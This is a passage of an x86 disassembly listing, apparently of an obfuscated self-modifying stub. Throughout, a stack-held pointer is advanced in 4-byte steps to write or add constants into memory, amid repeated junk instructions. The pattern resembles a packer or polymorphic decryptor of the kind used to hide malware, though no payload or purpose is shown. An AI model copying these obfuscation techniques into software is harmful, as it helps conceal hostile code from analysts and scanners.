  40228f:	81 00 8b 44 24 e0    	addl   $0xe024448b,(%eax)
  402295:	03 cf                	add    %edi,%ecx
  402297:	33 c0                	xor    %eax,%eax
  402299:	b0 04                	mov    $0x4,%al
  40229b:	01 44 24 e0          	add    %eax,-0x20(%esp)
  40229f:	0b d5                	or     %ebp,%edx
  4022a1:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  4022a5:	c7 03 81 00 a8 00    	movl   $0xa80081,(%ebx)
  4022ab:	66 8b d6             	mov    %si,%dx
  4022ae:	33 d2                	xor    %edx,%edx
  4022b0:	b2 04                	mov    $0x4,%dl
  4022b2:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4022b6:	66 8b d5             	mov    %bp,%dx
  4022b9:	0b e8                	or     %eax,%ebp
  4022bb:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  4022bf:	81 03 00 be 8d b3    	addl   $0xb38dbe00,(%ebx)
  4022c5:	0b e8                	or     %eax,%ebp
  4022c7:	33 d2                	xor    %edx,%edx
  4022c9:	33 c9                	xor    %ecx,%ecx
  4022cb:	b1 04                	mov    $0x4,%cl
  4022cd:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  4022d1:	33 d2                	xor    %edx,%edx
  4022d3:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  4022d7:	81 01 79 f8 40 00    	addl   $0x40f879,(%ecx)
  4022dd:	c1 cb 02             	ror    $0x2,%ebx
  4022e0:	33 c9                	xor    %ecx,%ecx
  4022e2:	b1 04                	mov    $0x4,%cl
  4022e4:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  4022e8:	8d 69 02             	lea    0x2(%ecx),%ebp
  4022eb:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  4022ef:	81 01 33 c0 b0 04    	addl   $0x4b0c033,(%ecx)
  4022f5:	66 8b f2             	mov    %dx,%si
  4022f8:	8b da                	mov    %edx,%ebx
  4022fa:	03 c3                	add    %ebx,%eax
  4022fc:	33 db                	xor    %ebx,%ebx
  4022fe:	b3 04                	mov    $0x4,%bl
  402300:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402304:	8b da                	mov    %edx,%ebx
  402306:	03 c3                	add    %ebx,%eax
  402308:	bd 6b db 40 00       	mov    $0x40db6b,%ebp
  40230d:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  402311:	81 09 01 44 24 e0    	orl    $0xe0244401,(%ecx)
  402317:	03 c3                	add    %ebx,%eax
  402319:	33 d2                	xor    %edx,%edx
  40231b:	b2 04                	mov    $0x4,%dl
  40231d:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402321:	bd 6b db 40 00       	mov    $0x40db6b,%ebp
  402326:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40232a:	81 00 8b c7 8b 4c    	addl   $0x4c8bc78b,(%eax)
  402330:	66 2b e8             	sub    %ax,%bp
  402333:	8d 6b 02             	lea    0x2(%ebx),%ebp
  402336:	33 d2                	xor    %edx,%edx
  402338:	b2 04                	mov    $0x4,%dl
  40233a:	01 54 24 e0          	add    %edx,-0x20(%esp)
  40233e:	8d 6b 02             	lea    0x2(%ebx),%ebp
  402341:	0f be db             	movsbl %bl,%ebx
  402344:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402348:	c7 02 24 e0 81 01    	movl   $0x181e024,(%edx)
  40234e:	0f be db             	movsbl %bl,%ebx
  402351:	33 c0                	xor    %eax,%eax
  402353:	b0 04                	mov    $0x4,%al
  402355:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402359:	85 e8                	test   %ebp,%eax
  40235b:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  40235f:	b8 39 23 84 45       	mov    $0x45842339,%eax
  402364:	ab                   	stos   %eax,%es:(%edi)
  402365:	8d 91 ed d8 40 00    	lea    0x40d8ed(%ecx),%edx
  40236b:	33 c9                	xor    %ecx,%ecx
  40236d:	b1 04                	mov    $0x4,%cl
  40236f:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402373:	c1 c8 02             	ror    $0x2,%eax
  402376:	23 c6                	and    %esi,%eax
  402378:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  40237c:	81 03 0f c1 e8 f7    	addl   $0xf7e8c10f,(%ebx)
  402382:	23 c6                	and    %esi,%eax
  402384:	c1 d1 02             	rcl    $0x2,%ecx
  402387:	33 c9                	xor    %ecx,%ecx
  402389:	b1 04                	mov    $0x4,%cl
  40238b:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  40238f:	c1 d1 02             	rcl    $0x2,%ecx
  402392:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402396:	81 02 c1 ff f8 40    	addl   $0x40f8ffc1,(%edx)
  40239c:	8d 81 6a fb 40 00    	lea    0x40fb6a(%ecx),%eax
  4023a2:	33 db                	xor    %ebx,%ebx
  4023a4:	b3 04                	mov    $0x4,%bl
  4023a6:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  4023aa:	8b eb                	mov    %ebx,%ebp
  4023ac:	8d 5d 02             	lea    0x2(%ebp),%ebx
  4023af:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4023b3:	81 08 00 33 c0 b0    	orl    $0xb0c03300,(%eax)
  4023b9:	8d 5d 02             	lea    0x2(%ebp),%ebx
  4023bc:	33 c0                	xor    %eax,%eax
  4023be:	b0 04                	mov    $0x4,%al
  4023c0:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4023c4:	8b dd                	mov    %ebp,%ebx
  4023c6:	66 33 c8             	xor    %ax,%cx
  4023c9:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4023cd:	b8 04 01 44 24       	mov    $0x24440104,%eax
  4023d2:	ab                   	stos   %eax,%es:(%edi)
  4023d3:	66 33 c8             	xor    %ax,%cx
  4023d6:	0f be d4             	movsbl %ah,%edx
  4023d9:	0f be c7             	movsbl %bh,%eax
  4023dc:	33 d2                	xor    %edx,%edx
  4023de:	b2 04                	mov    $0x4,%dl
  4023e0:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4023e4:	0f be d4             	movsbl %ah,%edx
  4023e7:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  4023eb:	81 01 e0 f7 c1 ff    	addl   $0xffc1f7e0,(%ecx)
  4023f1:	0f be c7             	movsbl %bh,%eax
  4023f4:	f7 d9                	neg    %ecx
  4023f6:	2b f0                	sub    %eax,%esi
  4023f8:	33 c0                	xor    %eax,%eax
  4023fa:	b0 04                	mov    $0x4,%al
  4023fc:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402400:	f7 d9                	neg    %ecx
  402402:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402406:	81 03 f8 40 00 8b    	addl   $0x8b0040f8,(%ebx)
  40240c:	2b f0                	sub    %eax,%esi
  40240e:	81 f5 7f dd 40 00    	xor    $0x40dd7f,%ebp
  402414:	33 c9                	xor    %ecx,%ecx
  402416:	b1 04                	mov    $0x4,%cl
  402418:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  40241c:	81 f5 7f dd 40 00    	xor    $0x40dd7f,%ebp
  402422:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402426:	81 0b 5c 24 e0 81    	orl    $0x81e0245c,(%ebx)
  40242c:	03 e8                	add    %eax,%ebp
  40242e:	33 d2                	xor    %edx,%edx
  402430:	b2 04                	mov    $0x4,%dl
  402432:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402436:	66 23 c9             	and    %cx,%cx
  402439:	2b d7                	sub    %edi,%edx
  40243b:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40243f:	81 00 03 97 e8 4b    	addl   $0x4be89703,(%eax)
  402445:	2b d7                	sub    %edi,%edx
  402447:	33 c9                	xor    %ecx,%ecx
  402449:	b1 04                	mov    $0x4,%cl
  40244b:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  40244f:	0f be c3             	movsbl %bl,%eax
  402452:	03 ea                	add    %edx,%ebp
  402454:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402458:	81 03 72 81 33 7f    	addl   $0x7f338172,(%ebx)
  40245e:	03 ea                	add    %edx,%ebp
  402460:	81 de ef df 40 00    	sbb    $0x40dfef,%esi
  402466:	33 db                	xor    %ebx,%ebx
  402468:	b3 04                	mov    $0x4,%bl
  40246a:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  40246e:	81 de ef df 40 00    	sbb    $0x40dfef,%esi
  402474:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402478:	81 02 e9 4b 72 8d    	addl   $0x8d724be9,(%edx)
  40247e:	83 ef 02             	sub    $0x2,%edi
  402481:	0f a4 c0 03          	shld   $0x3,%eax,%eax
  402485:	33 c9                	xor    %ecx,%ecx
  402487:	b1 04                	mov    $0x4,%cl
  402489:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  40248d:	0f a4 c0 03          	shld   $0x3,%eax,%eax
  402491:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402495:	81 08 b1 f9 f8 40    	orl    $0x40f8f9b1,(%eax)
  40249b:	2b f8                	sub    %eax,%edi
  40249d:	33 c0                	xor    %eax,%eax
  40249f:	b0 04                	mov    $0x4,%al
  4024a1:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4024a5:	66 23 c1             	and    %cx,%ax
  4024a8:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4024ac:	81 00 00 33 db b3    	addl   $0xb3db3300,(%eax)
  4024b2:	bb f8 fd 40 00       	mov    $0x40fdf8,%ebx
  4024b7:	33 c9                	xor    %ecx,%ecx
  4024b9:	b1 04                	mov    $0x4,%cl
  4024bb:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  4024bf:	33 d8                	xor    %eax,%ebx
  4024c1:	66 0b e9             	or     %cx,%bp
  4024c4:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  4024c8:	81 02 04 01 5c 24    	addl   $0x245c0104,(%edx)
  4024ce:	66 0b e9             	or     %cx,%bp
  4024d1:	81 dd 68 d8 40 00    	sbb    $0x40d868,%ebp
  4024d7:	33 c0                	xor    %eax,%eax
  4024d9:	b0 04                	mov    $0x4,%al
  4024db:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4024df:	81 dd 68 d8 40 00    	sbb    $0x40d868,%ebp
  4024e5:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  4024e9:	c7 01 e0 8d 7e 02    	movl   $0x27e8de0,(%ecx)
  4024ef:	33 cd                	xor    %ebp,%ecx
  4024f1:	33 df                	xor    %edi,%ebx
  4024f3:	c1 e0 02             	shl    $0x2,%eax
  4024f6:	33 d2                	xor    %edx,%edx
  4024f8:	b2 04                	mov    $0x4,%dl
  4024fa:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4024fe:	33 df                	xor    %edi,%ebx
  402500:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402504:	81 08 8b 44 24 e0    	orl    $0xe024448b,(%eax)
  40250a:	c1 e0 02             	shl    $0x2,%eax
  40250d:	66 03 fa             	add    %dx,%di
  402510:	83 df 02             	sbb    $0x2,%edi
  402513:	33 db                	xor    %ebx,%ebx
  402515:	b3 04                	mov    $0x4,%bl
  402517:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  40251b:	66 03 fa             	add    %dx,%di
  40251e:	83 df 02             	sbb    $0x2,%edi
  402521:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402525:	c7 03 81 00 00 c3    	movl   $0xc3000081,(%ebx)
  40252b:	83 df 02             	sbb    $0x2,%edi
  40252e:	33 db                	xor    %ebx,%ebx
  402530:	b3 04                	mov    $0x4,%bl
  402532:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402536:	85 cd                	test   %ecx,%ebp
  402538:	33 eb                	xor    %ebx,%ebp
  40253a:	8d aa 6e d9 40 00    	lea    0x40d96e(%edx),%ebp
  402540:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402544:	81 03 60 b8 66 33    	addl   $0x3366b860,(%ebx)
  40254a:	33 eb                	xor    %ebx,%ebp
  40254c:	8d aa 6e d9 40 00    	lea    0x40d96e(%edx),%ebp
  402552:	33 db                	xor    %ebx,%ebx
  402554:	b3 04                	mov    $0x4,%bl
  402556:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  40255a:	8d aa 6e d9 40 00    	lea    0x40d96e(%edx),%ebp
  402560:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402564:	c7 00 df 0f a4 d0    	movl   $0xd0a40fdf,(%eax)
  40256a:	0f a4 e8 03          	shld   $0x3,%ebp,%eax
  40256e:	33 db                	xor    %ebx,%ebx
  402570:	b3 04                	mov    $0x4,%bl
  402572:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402576:	c1 d7 02             	rcl    $0x2,%edi
  402579:	66 2b c3             	sub    %bx,%ax
  40257c:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  402580:	c7 01 03 33 db b3    	movl   $0xb3db3303,(%ecx)
  402586:	66 2b c3             	sub    %bx,%ax
  402589:	23 e9                	and    %ecx,%ebp
  40258b:	33 db                	xor    %ebx,%ebx
  40258d:	b3 04                	mov    $0x4,%bl
  40258f:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402593:	23 e9                	and    %ecx,%ebp
  402595:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402599:	c7 02 04 01 5c 24    	movl   $0x245c0104,(%edx)
  40259f:	66 8b cf             	mov    %di,%cx
  4025a2:	8b c2                	mov    %edx,%eax
  4025a4:	33 c7                	xor    %edi,%eax
  4025a6:	33 c9                	xor    %ecx,%ecx
  4025a8:	b1 04                	mov    $0x4,%cl
  4025aa:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  4025ae:	8b c2                	mov    %edx,%eax
  4025b0:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  4025b4:	81 03 e0 0f a4 d0    	addl   $0xd0a40fe0,(%ebx)
  4025ba:	33 c7                	xor    %edi,%eax
  4025bc:	33 c0                	xor    %eax,%eax
  4025be:	b0 04                	mov    $0x4,%al
  4025c0:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4025c4:	f7 ed                	imul   %ebp
  4025c6:	85 da                	test   %ebx,%edx
  4025c8:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  4025cc:	c7 01 03 8b 44 24    	movl   $0x24448b03,(%ecx)
  4025d2:	85 da                	test   %ebx,%edx
  4025d4:	33 d2                	xor    %edx,%edx
  4025d6:	b2 04                	mov    $0x4,%dl
  4025d8:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4025dc:	0b d2                	or     %edx,%edx
  4025de:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4025e2:	b8 e0 81 00 2c       	mov    $0x2c0081e0,%eax
  4025e7:	ab                   	stos   %eax,%es:(%edi)
  4025e8:	66 33 ff             	xor    %di,%di
  4025eb:	85 ca                	test   %ecx,%edx
  4025ed:	33 d2                	xor    %edx,%edx
  4025ef:	b2 04                	mov    $0x4,%dl
  4025f1:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4025f5:	85 ca                	test   %ecx,%edx
  4025f7:	0f b6 cb             	movzbl %bl,%ecx
  4025fa:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4025fe:	81 00 69 b8 ea 81    	addl   $0x81eab869,(%eax)
  402604:	0f b6 cb             	movzbl %bl,%ecx
  402607:	66 03 ef             	add    %di,%bp
  40260a:	33 db                	xor    %ebx,%ebx
  40260c:	b3 04                	mov    $0x4,%bl
  40260e:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402612:	66 03 ef             	add    %di,%bp
  402615:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  402619:	b8 30 2c 68 ba       	mov    $0xba682c30,%eax
  40261e:	ab                   	stos   %eax,%es:(%edi)
  40261f:	66 33 f6             	xor    %si,%si
  402622:	f7 ee                	imul   %esi
  402624:	33 c9                	xor    %ecx,%ecx
  402626:	b1 04                	mov    $0x4,%cl
  402628:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  40262c:	f7 ee                	imul   %esi
  40262e:	66 8b f1             	mov    %cx,%si
  402631:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402635:	81 03 e9 0f ac c8    	addl   $0xc8ac0fe9,(%ebx)
  40263b:	66 8b f1             	mov    %cx,%si
  40263e:	33 db                	xor    %ebx,%ebx
  402640:	b3 04                	mov    $0x4,%bl
  402642:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402646:	85 ca                	test   %ecx,%edx
  402648:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40264c:	81 08 03 33 d2 b2    	orl    $0xb2d23303,(%eax)
  402652:	81 f3 6a d8 40 00    	xor    $0x40d86a,%ebx
  402658:	33 c0                	xor    %eax,%eax
  40265a:	b0 04                	mov    $0x4,%al
  40265c:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402660:	f7 e5                	mul    %ebp
  402662:	03 c2                	add    %edx,%eax
  402664:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  402668:	81 02 04 01 54 24    	addl   $0x24540104,(%edx)
  40266e:	03 c2                	add    %edx,%eax
  402670:	0f b6 c2             	movzbl %dl,%eax
  402673:	66 33 c6             	xor    %si,%ax
  402676:	33 db                	xor    %ebx,%ebx
  402678:	b3 04                	mov    $0x4,%bl
  40267a:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  40267e:	0f b6 c2             	movzbl %dl,%eax
  402681:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  402685:	b8 e0 66 23 fb       	mov    $0xfb2366e0,%eax
  40268a:	ab                   	stos   %eax,%es:(%edi)
  40268b:	66 33 c6             	xor    %si,%ax
  40268e:	66 8b c9             	mov    %cx,%cx
  402691:	33 c0                	xor    %eax,%eax
  402693:	b0 04                	mov    $0x4,%al
  402695:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402699:	66 8b c9             	mov    %cx,%cx
  40269c:	85 d3                	test   %edx,%ebx
  40269e:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  4026a2:	81 01 8b 4c 24 e0    	addl   $0xe0244c8b,(%ecx)
  4026a8:	85 d3                	test   %edx,%ebx
  4026aa:	66 23 da             	and    %dx,%bx
  4026ad:	33 c9                	xor    %ecx,%ecx
  4026af:	b1 04                	mov    $0x4,%cl
  4026b1:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  4026b5:	66 23 da             	and    %dx,%bx
  4026b8:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4026bc:	81 08 81 01 b9 40    	orl    $0x40b90181,(%eax)
  4026c2:	85 f1                	test   %esi,%ecx
  4026c4:	23 f5                	and    %ebp,%esi
  4026c6:	66 2b d5             	sub    %bp,%dx
  4026c9:	33 d2                	xor    %edx,%edx
  4026cb:	b2 04                	mov    $0x4,%dl
  4026cd:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4026d1:	23 f5                	and    %ebp,%esi
  4026d3:	66 2b d5             	sub    %bp,%dx
  4026d6:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  4026da:	c7 01 00 00 83 c5    	movl   $0xc5830000,(%ecx)
  4026e0:	66 2b d5             	sub    %bp,%dx
  4026e3:	33 db                	xor    %ebx,%ebx
  4026e5:	b3 04                	mov    $0x4,%bl
  4026e7:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  4026eb:	33 d1                	xor    %ecx,%edx
  4026ed:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  4026f1:	c7 02 02 33 db b3    	movl   $0xb3db3302,(%edx)
  4026f7:	66 03 f0             	add    %ax,%si
  4026fa:	33 dd                	xor    %ebp,%ebx
  4026fc:	23 d8                	and    %eax,%ebx
  4026fe:	33 c0                	xor    %eax,%eax
  402700:	b0 04                	mov    $0x4,%al
  402702:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402706:	33 dd                	xor    %ebp,%ebx
  402708:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40270c:	81 00 04 01 5c 24    	addl   $0x245c0104,(%eax)
  402712:	23 d8                	and    %eax,%ebx
  402714:	66 2b e9             	sub    %cx,%bp
  402717:	33 c0                	xor    %eax,%eax
  402719:	b0 04                	mov    $0x4,%al
  40271b:	01 44 24 e0          	add    %eax,-0x20(%esp)
  40271f:	66 2b e9             	sub    %cx,%bp
  402722:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402726:	c7 00 e0 81 db 7c    	movl   $0x7cdb81e0,(%eax)
  40272c:	2b c0                	sub    %eax,%eax
  40272e:	8b da                	mov    %edx,%ebx
  402730:	33 c9                	xor    %ecx,%ecx
  402732:	b1 04                	mov    $0x4,%cl
  402734:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402738:	8b da                	mov    %edx,%ebx
  40273a:	03 f5                	add    %ebp,%esi
  40273c:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  402740:	81 01 de 40 00 8b    	addl   $0x8b0040de,(%ecx)
  402746:	03 f5                	add    %ebp,%esi
  402748:	33 c0                	xor    %eax,%eax
  40274a:	b0 04                	mov    $0x4,%al
  40274c:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402750:	66 33 ea             	xor    %dx,%bp
  402753:	66 33 f7             	xor    %di,%si
  402756:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40275a:	81 00 44 24 e0 81    	addl   $0x81e02444,(%eax)
  402760:	66 33 f7             	xor    %di,%si
  402763:	66 2b fd             	sub    %bp,%di
  402766:	33 db                	xor    %ebx,%ebx
  402768:	b3 04                	mov    $0x4,%bl
  40276a:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  40276e:	66 2b fd             	sub    %bp,%di
  402771:	8b d5                	mov    %ebp,%edx
  402773:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  402777:	c7 03 00 50 4f 88    	movl   $0x884f5000,(%ebx)
  40277d:	8b d5                	mov    %ebp,%edx
  40277f:	0f a4 c0 03          	shld   $0x3,%eax,%eax
  402783:	33 c9                	xor    %ecx,%ecx
  402785:	b1 04                	mov    $0x4,%cl
  402787:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  40278b:	0f a4 c0 03          	shld   $0x3,%eax,%eax
  40278f:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402793:	81 00 e5 81 30 50    	addl   $0x503081e5,(%eax)
  402799:	03 c3                	add    %ebx,%eax
  40279b:	66 03 d1             	add    %cx,%dx
  40279e:	33 d2                	xor    %edx,%edx
  4027a0:	b2 04                	mov    $0x4,%dl
  4027a2:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4027a6:	66 03 d1             	add    %cx,%dx
  4027a9:	66 85 f6             	test   %si,%si
  4027ac:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  4027b0:	81 02 ce 64 e5 33    	addl   $0x33e564ce,(%edx)
  4027b6:	66 85 f6             	test   %si,%si
  4027b9:	33 c0                	xor    %eax,%eax
  4027bb:	b0 04                	mov    $0x4,%al
  4027bd:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4027c1:	66 8b d6             	mov    %si,%dx
  4027c4:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  4027c8:	c7 02 c9 33 c0 b0    	movl   $0xb0c033c9,(%edx)
  4027ce:	66 23 fd             	and    %bp,%di
  4027d1:	2b ea                	sub    %edx,%ebp
  4027d3:	66 2b dd             	sub    %bp,%bx
  4027d6:	33 d2                	xor    %edx,%edx
  4027d8:	b2 04                	mov    $0x4,%dl
  4027da:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4027de:	2b ea                	sub    %edx,%ebp
  4027e0:	66 2b dd             	sub    %bp,%bx
  4027e3:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  4027e7:	c7 01 04 01 44 24    	movl   $0x24440104,(%ecx)
  4027ed:	66 2b dd             	sub    %bp,%bx
  4027f0:	66 2b e9             	sub    %cx,%bp
  4027f3:	33 db                	xor    %ebx,%ebx
  4027f5:	b3 04                	mov    $0x4,%bl
  4027f7:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  4027fb:	66 2b e9             	sub    %cx,%bp
  4027fe:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  402802:	81 00 e0 2b df 8b    	addl   $0x8bdf2be0,(%eax)
  402808:	0f b6 cf             	movzbl %bh,%ecx
  40280b:	33 c9                	xor    %ecx,%ecx
  40280d:	b1 04                	mov    $0x4,%cl
  40280f:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402813:	85 c7                	test   %eax,%edi
  402815:	66 0b c5             	or     %bp,%ax
  402818:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  40281c:	81 03 54 24 e0 81    	addl   $0x81e02454,(%ebx)
  402822:	66 0b c5             	or     %bp,%ax
  402825:	33 d2                	xor    %edx,%edx
  402827:	b2 04                	mov    $0x4,%dl
  402829:	01 54 24 e0          	add    %edx,-0x20(%esp)
  40282d:	66 33 c0             	xor    %ax,%ax
  402830:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  402834:	81 01 02 02 00 00    	addl   $0x202,(%ecx)
  40283a:	66 23 f7             	and    %di,%si
  40283d:	33 c9                	xor    %ecx,%ecx
  40283f:	b1 04                	mov    $0x4,%cl
  402841:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  402845:	66 33 fd             	xor    %bp,%di
  402848:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  40284c:	c7 02 8d 8d 41 02    	movl   $0x2418d8d,(%edx)
  402852:	66 2b f2             	sub    %dx,%si
  402855:	66 2b cd             	sub    %bp,%cx
  402858:	66 03 d1             	add    %cx,%dx
  40285b:	33 c0                	xor    %eax,%eax
  40285d:	b0 04                	mov    $0x4,%al
  40285f:	01 44 24 e0          	add    %eax,-0x20(%esp)
  402863:	66 2b cd             	sub    %bp,%cx
  402866:	66 03 d1             	add    %cx,%dx
  402869:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  40286d:	b8 66 0b f9 33       	mov    $0x33f90b66,%eax
  402872:	ab                   	stos   %eax,%es:(%edi)
  402873:	66 03 d1             	add    %cx,%dx
  402876:	66 0b e8             	or     %ax,%bp
  402879:	33 d2                	xor    %edx,%edx
  40287b:	b2 04                	mov    $0x4,%dl
  40287d:	01 54 24 e0          	add    %edx,-0x20(%esp)
  402881:	66 0b e8             	or     %ax,%bp
  402884:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  402888:	81 01 d2 b2 04 01    	addl   $0x104b2d2,(%ecx)
  40288e:	66 0b fa             	or     %dx,%di
  402891:	b8 7d df 40 00       	mov    $0x40df7d,%eax
  402896:	33 c0                	xor    %eax,%eax
  402898:	b0 04                	mov    $0x4,%al
  40289a:	01 44 24 e0          	add    %eax,-0x20(%esp)
  40289e:	b8 7d df 40 00       	mov    $0x40df7d,%eax
  4028a3:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  4028a7:	c7 03 54 24 e0 66    	movl   $0x66e02454,(%ebx)
  4028ad:	0f be d3             	movsbl %bl,%edx
  4028b0:	33 db                	xor    %ebx,%ebx
  4028b2:	b3 04                	mov    $0x4,%bl
  4028b4:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  4028b8:	66 2b cf             	sub    %di,%cx
  4028bb:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4028bf:	b8 0b f9 03 c7       	mov    $0xc703f90b,%eax
  4028c4:	ab                   	stos   %eax,%es:(%edi)
  4028c5:	66 0b ea             	or     %dx,%bp
  4028c8:	03 e9                	add    %ecx,%ebp
  4028ca:	85 c1                	test   %eax,%ecx
  4028cc:	33 d2                	xor    %edx,%edx
  4028ce:	b2 04                	mov    $0x4,%dl
  4028d0:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4028d4:	03 e9                	add    %ecx,%ebp
  4028d6:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4028da:	b8 8b 5c 24 e0       	mov    $0xe0245c8b,%eax
  4028df:	ab                   	stos   %eax,%es:(%edi)
  4028e0:	85 c1                	test   %eax,%ecx
  4028e2:	0f be cd             	movsbl %ch,%ecx
  4028e5:	8d 46 02             	lea    0x2(%esi),%eax
  4028e8:	33 d2                	xor    %edx,%edx
  4028ea:	b2 04                	mov    $0x4,%dl
  4028ec:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4028f0:	0f be cd             	movsbl %ch,%ecx
  4028f3:	8d 46 02             	lea    0x2(%esi),%eax
  4028f6:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  4028fa:	81 02 81 03 1c 24    	addl   $0x241c0381,(%edx)
  402900:	8d 46 02             	lea    0x2(%esi),%eax
  402903:	2b da                	sub    %edx,%ebx
  402905:	33 d2                	xor    %edx,%edx
  402907:	b2 04                	mov    $0x4,%dl
  402909:	01 54 24 e0          	add    %edx,-0x20(%esp)
  40290d:	2b da                	sub    %edx,%ebx
  40290f:	0b d1                	or     %ecx,%edx
  402911:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  402915:	81 01 55 57 03 c7    	addl   $0xc7035755,(%ecx)
  40291b:	0b d1                	or     %ecx,%edx
  40291d:	33 db                	xor    %ebx,%ebx
  40291f:	b3 04                	mov    $0x4,%bl
  402921:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  402925:	8d 49 02             	lea    0x2(%ecx),%ecx
  402928:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  40292c:	81 02 8b f5 97 0b    	addl   $0xb97f58b,(%edx)
  402932:	66 03 ca             	add    %dx,%cx
  402935:	81 db 7a da 40 00    	sbb    $0x40da7a,%ebx
